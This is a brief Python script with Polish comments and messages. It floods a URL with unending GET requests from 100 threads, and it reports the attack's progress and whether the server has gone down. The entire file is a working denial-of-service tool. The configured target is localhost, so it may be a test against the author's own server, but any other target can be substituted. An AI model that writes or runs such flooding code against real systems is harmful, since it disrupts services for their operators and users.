import requests
import threading

TARGET_URL = "http://127.0.0.1:8080/heavy" 
THREADS = 100 

def attack():
    session = requests.Session()
    while True:
        try:
            response = session.get(TARGET_URL, timeout=5)
            print(f"Atak trwa... Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print("!!! SERWER POWALONY (Błąd połączenia) !!!")

print(f"Uruchamiam atak na {TARGET_URL} przy użyciu {THREADS} wątków...")

for i in range(THREADS):
    t = threading.Thread(target=attack)
    # daemon=True sprawi, ze skrypt zamknie sie od razu po Ctrl+C
    t.daemon = True 
    t.start()

while True:
    pass